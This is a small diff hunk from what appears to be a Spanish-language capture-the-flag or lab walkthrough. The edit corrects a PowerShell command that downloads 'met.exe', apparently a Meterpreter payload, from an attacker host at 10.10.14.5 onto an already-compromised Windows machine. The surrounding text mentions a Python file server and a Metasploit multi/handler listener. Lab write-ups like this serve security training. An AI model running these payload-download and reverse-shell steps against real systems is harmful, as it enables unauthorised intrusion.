@@ -99,7 +99,7 @@ python3 -m http.server 80
 
 Aprovechando la shell PS que ya tenemos descargamos sherlock del siguiente modo
 ```
-iwr -uri http http://10.10.14.5/met.exe -outfile met.exe
+iwr -uri http://10.10.14.5/met.exe -outfile met.exe
 ```
 
 Por parte de nuestra maquina atacante a la escucha deberemos de utilizar el multi/handler de msfconsole y definir los siguientes parámetros.
